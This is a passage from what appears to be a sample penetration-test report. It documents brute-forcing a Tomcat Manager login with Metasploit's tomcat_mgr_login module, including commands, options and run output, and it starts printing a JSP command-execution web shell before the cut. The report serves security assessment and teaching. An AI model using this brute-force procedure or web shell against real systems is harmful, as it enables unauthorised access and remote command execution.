{"text": "the Tomcat Manager page uses Basic Authentication, which has no inherent protections against password brute-forcing attacks. External References https://attack.mitre.org/techniques/T1078/001/ Finding Evidence: Setting up the Metasploit auxiliary scanner to brute-force Tomcat manager usernames and passwords. msf6 > use auxiliary/scanner/http/tomcat_mgr_login msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 192.168.195.205 msf6 auxiliary(scanner/http/tomcat_mgr_login) > set STOP_ON_SUCCESS true Figure 24: Setting Up Tomcat Login Scanner The tester validated scanner settings before running the tool. 24\\nmsf6 auxiliary(scanner/http/tomcat_mgr_login) > show options Module options (auxiliary/scanner/http/tomcat_mgr_login): Name Current Setting Required Description ---- --------------- -------- ----------- BLANK_PASSWORDS false no Try blank passwords for all users BRUTEFORCE_SPEED 5 yes How fast to bruteforce, from 0 to 5 DB_ALL_CREDS false no Try each user/password couple stored in the current database DB_ALL_PASS false no Add all passwords in the current database to the list DB_ALL_USERS false no Add all users in the current database to the list PASSWORD no The HTTP password to specify for authentication PASS_FILE ../tomcat_mgr_default_pass.txt no File containing passwords, one per line Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 192.168.195.205 yes The target host(s), range CIDR identifier, or hosts file RPORT 8080 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections STOP_ON_SUCCESS true yes Stop guessing when a credential works for a host TARGETURI /manager/html yes URI for Manager login. Default is /manager/html THREADS 1 yes The number of concurrent threads (max one per host) USERNAME no The HTTP username to specify for authentication USERPASS_FILE ../tomcat_mgr_default_userpass.txt no File containing users and passwords separated by space USER_AS_PASS false no Try the username as the password for all users USER_FILE ../tomcat_mgr_default_users.txt no File containing users, one per line VERBOSE true yes Whether to print output for all attempts VHOST no HTTP server virtual host Figure 25: Checking Scanner Options The tester then ran the Metasploit module to attempt to brute force the Tomcat Manager login credentials and was successful, retrieving the password for the QCC user. msf6 auxiliary(scanner/http/tomcat_mgr_login) > run [!] No active DB -- Credential data will not be saved! [-] 192.168.195.205:8080 - LOGIN FAILED: admin:admin (Incorrect) [-] 192.168.195.205:8080 - LOGIN FAILED: admin:manager (Incorrect) [-] 192.168.195.205:8080 - LOGIN FAILED: admin:role1 (Incorrect) [-] 192.168.195.205:8080 - LOGIN FAILED: admin:root (Incorrect) [-] 192.168.195.205:8080 - LOGIN FAILED: admin:tomcat (Incorrect) <SNIP> [-] 192.168.195.205:8080 - LOGIN FAILED: role1:admin (Incorrect) [-] 192.168.195.205:8080 - LOGIN FAILED: cxsdk:kdsxc (Incorrect) [-] 192.168.195.205:8080 - LOGIN FAILED: root:owaspbwa (Incorrect) [-] 192.168.195.205:8080 - LOGIN FAILED: ADMIN:ADMIN (Incorrect) [-] 192.168.195.205:8080 - LOGIN FAILED: xampp:xampp (Incorrect) [-] 192.168.195.205:8080 - LOGIN FAILED: tomcat:s3cret (Incorrect) [+] 192.168.195.205:8080 - Login Successful: QCC:<REDACTED> [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed Figure 26: Running the Login Scanner The tester then prepared a JSP web shell to upload to the Tomcat server to achieve remote code execution. 25\\n$ cat cmd.jsp <%@ page import=\"java.util.*,java.io.*\"%> <% // // JSP_KIT // // cmd.jsp = Command Execution (unix) // // by: Unknown // modified: 27/06/2003 // %> <HTML><BODY> <FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"> <INPUT TYPE=\"text\" NAME=\"cmd\"> <INPUT TYPE=\"submit\" VALUE=\"Send\"> </FORM> <pre> <% if (request.getParameter(\"cmd\") != null) { out.println(\"Command:", "metadata": {"doc_id": "Hack the Box - sample-penetration-testing-report-template", "chunk_id": 13}}